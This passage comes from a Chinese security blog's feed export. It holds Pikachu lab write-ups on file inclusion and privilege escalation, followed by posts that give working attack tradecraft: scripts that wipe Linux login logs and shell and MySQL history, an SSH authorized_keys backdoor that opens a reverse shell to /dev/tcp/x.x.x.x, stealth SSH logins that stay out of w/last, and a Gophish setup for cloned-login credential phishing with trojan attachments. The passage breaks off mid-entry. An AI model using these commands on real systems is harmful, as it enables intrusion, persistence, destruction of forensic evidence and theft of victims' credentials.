<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>require()也是用于文件包含的函数</p>
<p>和include()的区别在于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>

<p>所以这里当作文件包含利用即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-越权</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>越权，字面意思就是越过权限，完成其他权限拥有的操作</p>
<p>又分为水平越权和垂直越权</p>
<h3 id="水平越权-1"><a href="#水平越权-1" class="headerlink" title="水平越权"></a>水平越权</h3><p>当获取某普通用户的权限，可以对其他普通用户的接口进行操作</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先根据提示随便登录一个普通权限用户</p>
<p><img src="/images/image-20230110134707004.png" alt="image-20230110134707004"></p>
<p>可以看到有一个查看个人信息的接口</p>
<p><img src="/images/image-20230110134756218.png" alt="image-20230110134756218"></p>
<p>请求url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p>当我们更改username的值为其他用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=提交</span><br></pre></td></tr></table></figure>

<p>成功获取kobe的个人信息</p>
<p><img src="/images/image-20230110134959340.png" alt="image-20230110134959340"></p>
<p>可以判断，该接口未作任何身份校验，可直接越权访问其他用户个人信息</p>
<p>(注意，还是需要一个权限才能越权，否则也无法未授权访问)</p>
<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>越权，字面意思就是越过权限，完成其他权限拥有的操作</p>
<p>又分为水平越权和垂直越权</p>
<h3 id="垂直越权-1"><a href="#垂直越权-1" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>当获得普通用户权限，可以对管理员权限用户的接口进行操作</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>根据提示登录普通用户权限</p>
<p><img src="/images/image-20230110135343163.png" alt="image-20230110135343163"></p>
<p>可以发现普通用户只有查看权限</p>
<p><img src="/images/image-20230110135516941.png" alt="image-20230110135516941"></p>
<p>现在登录管理员权限</p>
<p>注意：这一步只是为了获取管理员的一些操作接口，在真实环境中，该接口可能通过其他方式获得，比如接口泄露(并不会获取到管理员权限)</p>
<p><img src="/images/image-20230110135702749.png" alt="image-20230110135702749"></p>
<h5 id="添加用户接口"><a href="#添加用户接口" class="headerlink" title="添加用户接口"></a>添加用户接口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /DX/pikachu/vul/overperm ission/op2/op2_admin_edit.php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">username=test&amp;password=111111&amp;sex=n&amp;phonenum=13888888888&amp;email=123456%40qq.com&amp;address=tianjiing&amp;submit=%E5%88%9B%E5%BB%BA</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110135901846.png" alt="image-20230110135901846"></p>
<p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>

<p>获取接口后退出登录，再次登录普通用户权限</p>
<p>利用普通用户权限访问添加用户接口，添加一个用户</p>
<p><img src="/images/image-20230110142027589.png" alt="image-20230110142027589"></p>
<p>重新登录到pikachu用户，可以看到越权添加的用户</p>
<p><img src="/images/image-20230110142105328.png" alt="image-20230110142105328"></p>
<h5 id="删除用户接口"><a href="#删除用户接口" class="headerlink" title="删除用户接口"></a>删除用户接口</h5><p>admin用户还提供了删除用户接口</p>
<p><img src="/images/image-20230110142222943.png" alt="image-20230110142222943"></p>
<p>同样，先抓取删除用户接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/overpermission/op2/op2_admin.php?id=90</span><br></pre></td></tr></table></figure>

<p>退出登录</p>
<p>登录pikachu用户，访问删除接口测试</p>
<p>经测试，删除接口不存在越权</p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>Linux各种痕迹清理</title>
    <url>/2023/05/31/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/Linux%E5%90%84%E7%A7%8D%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
    <content><![CDATA[<p>遇到新的痕迹清理会继续同步</p>
<h2 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h2><table>
<thead>
<tr>
<th>日志文件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;var&#x2F;log&#x2F;cron</td>
<td>记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;message</td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody></table>
<h5 id="清除用户登陆日志脚本"><a href="#清除用户登陆日志脚本" class="headerlink" title="清除用户登陆日志脚本"></a>清除用户登陆日志脚本</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sip=$(lastlog | grep $(whoami) | awk &#x27;&#123;print $3&#125;&#x27;);utmpdump /var/run/utmp |sed &quot;/$sip/d&quot; |utmpdump -r &gt;/tmp/utmp1 &amp;&amp;\mv  /tmp/utmp1 /var/run/utmp;utmpdump /var/log/wtmp |sed &quot;/$sip/d&quot; |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv  /tmp/wtmp1 /var/log/wtmp;utmpdump /var/log/btmp |sed &quot;/$sip/d&quot; |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv  /tmp/wtmp1 /var/log/btmp;find /var/log/ /var/run/ -type f | xargs sed -i &quot;/$sip/d&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/clipboard.png" alt="clipboard"></p>
<p>last等日志是二进制文件，无法直接修改。所以清除的最简单方式是清空日志文件本身。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># &gt; /var/log/wtmp</span><br><span class="line"># &gt; /var/log/btmp</span><br><span class="line"># &gt; /var/log/lastlog</span><br><span class="line"># &gt; /var/log/wtmp; &gt; /var/log/btmp; &gt; /var/log/lastlog</span><br></pre></td></tr></table></figure>

<h2 id="history历史命令"><a href="#history历史命令" class="headerlink" title="history历史命令"></a>history历史命令</h2><h3 id="history命令相关"><a href="#history命令相关" class="headerlink" title="history命令相关"></a>history命令相关</h3><h5 id="SSH关闭历史命令-history"><a href="#SSH关闭历史命令-history" class="headerlink" title="SSH关闭历史命令(history)"></a>SSH关闭历史命令(history)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br></pre></td></tr></table></figure>

<h5 id="不记录之后的命令"><a href="#不记录之后的命令" class="headerlink" title="不记录之后的命令"></a>不记录之后的命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set +o history</span><br></pre></td></tr></table></figure>

<h5 id="用于清除当前的记录"><a href="#用于清除当前的记录" class="headerlink" title="用于清除当前的记录"></a>用于清除当前的记录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history -c</span><br></pre></td></tr></table></figure>

<h3 id="x2F-root-x2F-bash-history相关"><a href="#x2F-root-x2F-bash-history相关" class="headerlink" title="&#x2F;root&#x2F;.bash_history相关"></a>&#x2F;root&#x2F;.bash_history相关</h3><p>bash_history也会记录历史命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/.bash_history</span><br></pre></td></tr></table></figure>

<p>注意 .bash_history在执行history -c后不会有变化 </p>
<h5 id="显示文件行号"><a href="#显示文件行号" class="headerlink" title="显示文件行号"></a>显示文件行号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat -n /root/.bash_history</span><br></pre></td></tr></table></figure>

<h5 id="删除500行以及以后的数据"><a href="#删除500行以及以后的数据" class="headerlink" title="删除500行以及以后的数据"></a>删除500行以及以后的数据</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i -e &#x27;500,$d&#x27; /root/.bash_history</span><br></pre></td></tr></table></figure>

<h2 id="mysql历史命令"><a href="#mysql历史命令" class="headerlink" title="mysql历史命令"></a>mysql历史命令</h2><p>mysql的历史命令记录存储于当前用户下的家目录的隐藏文件.mysql_history中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.mysql_history</span><br></pre></td></tr></table></figure>

<p>清空该文件或者删除该文件就可以清空历史命令记录</p>
<p><img src="/images/clipboard-1685497912147-2.png" alt="clipboard"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">head ~/.mysql_history</span><br><span class="line"># mysql的历史命令记录存储于当前用户下的家目录的隐藏文件.mysql_history中</span><br><span class="line"># 清空该文件或者删除该文件就可以清空历史命令记录</span><br><span class="line"></span><br><span class="line">&gt;~/.mysql_history</span><br><span class="line"># 再次使用mysql命令登录数据库，上下光标键就没有历史命令了</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
  </entry>
  <entry>
    <title>Linux公钥后门</title>
    <url>/2023/05/30/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Linux%E5%85%AC%E9%92%A5%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.thc.org/infecting-ssh-public-keys-with-backdoors">https://blog.thc.org/infecting-ssh-public-keys-with-backdoors</a></p>
<p><a href="https://mp.weixin.qq.com/s/R_CUPqa2WQUgOJu__5MFzg">https://mp.weixin.qq.com/s/R_CUPqa2WQUgOJu__5MFzg</a></p>
<h3 id="公钥"><a href="#公钥" class="headerlink" title="公钥"></a>公钥</h3><p>运维人员管理 Linux 服务器时，为了方便，经常把访问者的ssh公钥直接写入到被访问服务器的 ~&#x2F;.ssh&#x2F;authorized_keys 中并进行相应的配置，这样访问者可以使用固定的电脑无需输入密码就可以访问到服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/authorized_key</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230530104053420.png" alt="image-20230530104053420"></p>
<h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>使用公钥登录在一定程度上实现了安全和便利，避免了输入密码的麻烦，但是其实这里有一个不常用的参数非常适合用来做后门——command</p>
<p>当然如果在渗透过程中可以写入公钥，写入自己的公钥也是很好的选择</p>
<p>但在一些情况下，比如不对外暴露ssh端口，自己的公钥容易被删除</p>
<p>使用该后门可以实现一定的权限维持</p>
<p>配合上自己的公钥就是一个不错的利用</p>
<h3 id="command语法"><a href="#command语法" class="headerlink" title="command语法"></a>command语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command=&quot;ping test.dnslog.cn&quot; ssh-rsa............... </span><br></pre></td></tr></table></figure>

<p>在command后面添加命令即可</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>这里我们使用burp自带的dnslog进行测试</p>
<p><img src="/images/image-20230530105601781.png" alt="image-20230530105601781"></p>
<h5 id="copy一个子域名"><a href="#copy一个子域名" class="headerlink" title="copy一个子域名"></a>copy一个子域名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zjmmunbxbdpfov3v91iu3w4g076bu0.oastify.com</span><br></pre></td></tr></table></figure>

<h5 id="写进authorized-key"><a href="#写进authorized-key" class="headerlink" title="写进authorized_key"></a>写进authorized_key</h5><p><img src="/images/image-20230530105752805.png" alt="image-20230530105752805"></p>
<h5 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h5><p>无需重启 ssh 服务，使用公钥 ssh 访问该服务器</p>
<p><img src="/images/image-20230530110153358.png" alt="image-20230530110153358"></p>
<p>可以看到在使用相应的公钥(被添加command)访问时候，会执行我们写的命令</p>
<p>同时dnslog接收到请求</p>
<p><img src="/images/image-20230530110250855.png" alt="image-20230530110250855"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>需要使用对应的私钥连接公钥才会触发命令执行</p>
<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>这里尝试一下反弹shell的命令</p>
<p><img src="/images/image-20230530110944010.png" alt="image-20230530110944010"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/18887 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>像上述一样写入authorized_key文件</p>
<p>然后使用对应的私钥连接ssh</p>
<p><img src="/images/image-20230530111315136.png" alt="image-20230530111315136"></p>
<p>成功反弹shell</p>
<p><img src="/images/image-20230530111257749.png" alt="image-20230530111257749"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可见，可以在~&#x2F;.ssh&#x2F;authorized_key中写入后门命令，当运维人员使用公钥方式连接ssh时，就会触发相关命令</p>
]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
  </entry>
  <entry>
    <title>ssh隐身登录</title>
    <url>/2023/05/30/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/ssh%E9%9A%90%E8%BA%AB%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T root@192.168.199.123 /usr/bin/bash -i</span><br></pre></td></tr></table></figure>

<p>-T表示不分配伪终端</p>
<p>&#x2F;usr&#x2F;bin&#x2F;bash -i 表示在登录后调用bash命令</p>
<p>-i 表示是交互式shell</p>
<p>这样登陆将不会在w&#x2F;last命令结果中显示.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w/last</span><br></pre></td></tr></table></figure>

<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>但还是会被lsof -i:22 和 ps |grep ssh 等命令发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsof -i:22</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps |grep ssh</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
  </entry>
  <entry>
    <title>Gophish钓鱼</title>
    <url>/2023/05/14/%E7%A4%BE%E5%B7%A5/Gophish%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Gophish：开源网络钓鱼工具包</p>
<p>gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷，并且在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用。</p>
<h5 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h5><p>Gophish项目地址：<a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a></p>
<p>Gophish官网地址：<a href="https://getgophish.com/">https://getgophish.com/</a></p>
<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>这里使用linux搭建</p>
<h5 id="下载后解压放置服务器"><a href="#下载后解压放置服务器" class="headerlink" title="下载后解压放置服务器"></a>下载后解压放置服务器</h5><p><img src="/images/1666054452398-45567bcd-126d-447a-aa7d-96e6f1baa529.png"></p>
<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>admin_server是远程访问后台管理界面</p>
<p>将listen_url修改为0.0.0.0，端口自定义</p>
<p>如果仅通过本地访问，保持127.0.0.1:3333即可</p>
<p><img src="/images/1666061341280-91648f65-3e58-4d7e-97e1-4017aec9b61b.png"></p>
<p>phish_server是钓鱼界面，只有配置完钓鱼界面后才会显示，否则返回404</p>
<h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gophish</span><br></pre></td></tr></table></figure>

<p>注意，需要使用https</p>
<p>密码和用户名在启动时会显示在控制台<img src="/images/1666054771230-8117f88a-7956-4883-947d-b5d9a54e1fd2.png"></p>
<h5 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h5><p><img src="/images/1666054904457-c1d05df1-1c78-4fc1-bc56-c28ab89e1abc.png"></p>
<h5 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h5><p>如果出现Forbidden - CSRF token invalid报错</p>
<p>可能是浏览器插件的行为被拦截，换个干净的浏览器就行</p>
<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><p><img src="/images/1666055023403-ae6d48f9-c9c9-476e-84c1-cc42e9bf1620.png"></p>
<p>进入后台后，左边的栏目即代表各个功能</p>
<p>分别是Dashboard仪表板 、Campaigns钓鱼事件 、Users &amp; Groups用户和组 、Email Templates邮件模板 、Landing Pages钓鱼页面 、Sending Profiles发件策略六大功能</p>
<p>由于实际使用中并不是按照该顺序来配置各个功能，因此下面通过实际使用顺序来详细介绍各功能的使用方法</p>
<h2 id="Sending-Profiles-设置发件人的邮箱"><a href="#Sending-Profiles-设置发件人的邮箱" class="headerlink" title="Sending Profiles(设置发件人的邮箱)"></a>Sending Profiles(设置发件人的邮箱)</h2><p>设置发件人的邮箱</p>
<h5 id="点击New-Profile新建一个策略"><a href="#点击New-Profile新建一个策略" class="headerlink" title="点击New Profile新建一个策略"></a>点击New Profile新建一个策略</h5><h5 id="Email-Headers（可选）"><a href="#Email-Headers（可选）" class="headerlink" title="Email Headers（可选）"></a>Email Headers（可选）</h5><p>是自定义邮件头字段，例如邮件头的X-Mailer字段，若不修改此字段的值，通过gophish发出的邮件，其邮件头的X-Mailer的值默认为gophish。</p>
<p><img src="/images/1666056412483-8ba31223-5128-497d-a167-507288eded6d.png"></p>
<h5 id="password"><a href="#password" class="headerlink" title="password"></a>password</h5><p>需要填写邮箱的授权码</p>
<p>授权码通过qq邮箱获得</p>
<p><img src="/images/1666056651605-cf9c511a-bde4-4ec5-a033-fed05721e750.png"></p>
<h5 id="SMTP-from和Host写成一样的就行"><a href="#SMTP-from和Host写成一样的就行" class="headerlink" title="SMTP from和Host写成一样的就行"></a>SMTP from和Host写成一样的就行</h5><p><img src="/images/1666059283375-391f43fb-ff1c-441d-91d3-817ff8d2a51c.png"></p>
<p>测试中写成name&lt;邮箱&gt;格式无法发送</p>
<h5 id="host"><a href="#host" class="headerlink" title="host"></a>host</h5><p>qq邮箱的为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smtp.qq.com:465</span><br></pre></td></tr></table></figure>

<p>但这里要注意，如果搭建Gophish平台用的vps是阿里云的话，是不能使用25端口的，因为阿里云禁用25端口，你可以通过提工单解封，但申请通过的难度很大。<br>所以，我们这里可以把25端口改为465端口，即填写 smtp.qq.com:465，这样就可以成功发送邮件了。</p>
<p><img src="/images/1666056768870-1fefa4a9-ef9f-4811-a15b-8c012c048308.png"></p>
<h5 id="send-Test-Email"><a href="#send-Test-Email" class="headerlink" title="send Test Email"></a>send Test Email</h5><p><img src="/images/1666059250047-b43bc9da-0a79-443a-b986-496b9f43efa3.png"></p>
<p>真实环境中一般使用自己的邮服</p>
<h2 id="email-templates-邮件发送模板"><a href="#email-templates-邮件发送模板" class="headerlink" title="email templates(邮件发送模板)"></a>email templates(邮件发送模板)</h2><h5 id="配置邮件发送模板"><a href="#配置邮件发送模板" class="headerlink" title="配置邮件发送模板"></a>配置邮件发送模板</h5><p><img src="/images/1666059526379-e98f1aa7-41e0-4996-b20a-2c6870387c4b.png"></p>
<h5 id="可以使用eml文件直接导入"><a href="#可以使用eml文件直接导入" class="headerlink" title="可以使用eml文件直接导入"></a>可以使用eml文件直接导入</h5><p><img src="/images/1666060005349-e84db5ba-b967-4a2f-a22d-ba51f285d276.png"></p>
<p>把eml文件的内容粘贴进去即可</p>
<p><img src="/images/1666060072913-846786f1-e358-4adc-a83e-538e08b60307.png"></p>
<p>需要注意，在点击Import之前需要勾选上Change Links to Point to Landing Page，该功能实现了当创建钓鱼事件后，会将邮件中的超链接自动转变为钓鱼网站的URL</p>
<p><img src="/images/1666060357132-bc6035be-772d-415c-9167-988b3ff179d2.png"></p>
<h5 id="Add-Tracking-Image"><a href="#Add-Tracking-Image" class="headerlink" title="Add Tracking Image"></a>Add Tracking Image</h5><p>Add Tracking Image 是在钓鱼邮件末添加一个跟踪图像，用来跟踪受害用户是否打开了收到的钓鱼邮件。默认情况下是勾选的，如果不勾选就无法跟踪到受害用户是否打开了钓鱼邮件</p>
<p>（注：跟踪受害用户是否点击钓鱼链接以及捕捉提交数据不受其影响）</p>
<h5 id="Add-Files"><a href="#Add-Files" class="headerlink" title="Add Files"></a>Add Files</h5><p>Add Files 是在发送的邮件中添加附件，一是可以添加相关文件提高邮件真实性，二是可以配合免杀木马诱导受害用户下载并打开</p>
<p><img src="/images/1666060489331-b9bec34a-8831-4009-88dd-2c47b7720a28.png"></p>
<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p><img src="/images/1666063858059-0bafe9d2-5c80-4ce6-86a9-ab41907634c6.png"></p>
<p>可以看到，这里也让填sender了</p>
<p>区别就是这里填的就是显示的邮箱</p>
<p><img src="/images/image-20230210165224247.png" alt="image-20230210165224247"></p>
<p>注意link，发送邮件的时候会自动更改此url</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;您的京东订单【245835168852】电子发票已开具&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;&#123;&#123;.URL&#125;&#125;&quot;&gt;下载&lt;/a&gt; &#123;&#123;.Tracker&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1666063819970-63e12662-b834-49d1-8680-803b26a7d8e1.png"></p>
<h2 id="Landing-Pages-钓鱼页面"><a href="#Landing-Pages-钓鱼页面" class="headerlink" title="Landing Pages(钓鱼页面)"></a>Landing Pages(钓鱼页面)</h2><p>钓鱼页面</p>
<p>与钓鱼邮件模板的编辑一样，gophish为钓鱼页面的设计也提供了两种方式</p>
<h5 id="第一种是Import-Site"><a href="#第一种是Import-Site" class="headerlink" title="第一种是Import Site"></a>第一种是Import Site</h5><p>点击Import Site后，填写被伪造网站的URL，再点击Import，即可通过互联网自动抓取被伪造网站的前端代码</p>
<p>这里使用某大学登录界面</p>
<p><img src="/images/1666060751418-341be0dd-bd51-4efb-a46a-0130f165a718.png"></p>
<h5 id="记录用户提交信息和抓取密码"><a href="#记录用户提交信息和抓取密码" class="headerlink" title="记录用户提交信息和抓取密码"></a>记录用户提交信息和抓取密码</h5><p><img src="/images/1666060857337-4698e4cc-d1df-4525-aa13-e95e63b6d31a.png"></p>
<h5 id="redirect-to用于重定向"><a href="#redirect-to用于重定向" class="headerlink" title="redirect to用于重定向"></a>redirect to用于重定向</h5><p>点完提交按钮后跳转的位置</p>
<p><img src="/images/1666060941889-2583dbdf-8b7d-4286-a934-561c18150ed4.png"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>钓鱼页面中必须严格有下面的表单才可以接收到用户的动作和提交的内容，所以想抓取用户提交信息一般导入钓鱼页面后还需要手动设计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">   &lt;input name=&quot;username&quot; type=&quot;text&quot; placeholder=&quot;username&quot; /&gt;</span><br><span class="line">   &lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;password&quot; /&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>主要是这三部分</p>
<p><img src="/images/1666068977399-ca212500-eefe-4e49-b0bb-e28ffb54fcae.png"></p>
<h2 id="User-amp-Groups-配置用户和用户组"><a href="#User-amp-Groups-配置用户和用户组" class="headerlink" title="User&amp;Groups(配置用户和用户组)"></a>User&amp;Groups(配置用户和用户组)</h2><p>配置用户和用户组（添加需要进行钓鱼的邮箱和相关基础信息）</p>
<h5 id="支持CSV导入"><a href="#支持CSV导入" class="headerlink" title="支持CSV导入"></a>支持CSV导入</h5><p>可下载CSV模板</p>
<p><img src="/images/1666061160674-eb6dab2f-76f6-47a7-9e1f-6f49fb0bba1d.png"></p>
<h5 id="添加邮箱"><a href="#添加邮箱" class="headerlink" title="添加邮箱"></a>添加邮箱</h5><p><img src="/images/1666061241624-04dbb29c-7b1d-4c33-81f7-e7a4e3932ca1.png"></p>
<h2 id="campaigns-配置钓鱼测试"><a href="#campaigns-配置钓鱼测试" class="headerlink" title="campaigns(配置钓鱼测试)"></a>campaigns(配置钓鱼测试)</h2><p><img src="/images/1666061928651-e2ba4266-420f-4829-aa43-004854c51726.png"></p>
<p>这里当时写的有问题</p>
<p><img src="/images/image-20230210170553414.png" alt="image-20230210170553414"></p>
<p>应该用http</p>
<p><img src="/images/image-20230210170630013.png" alt="image-20230210170630013"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这里从网上随便找了个系统</p>
<h5 id="Landing-Pages配置"><a href="#Landing-Pages配置" class="headerlink" title="Landing Pages配置"></a>Landing Pages配置</h5><p>注意其登录部分要类似下面这样</p>
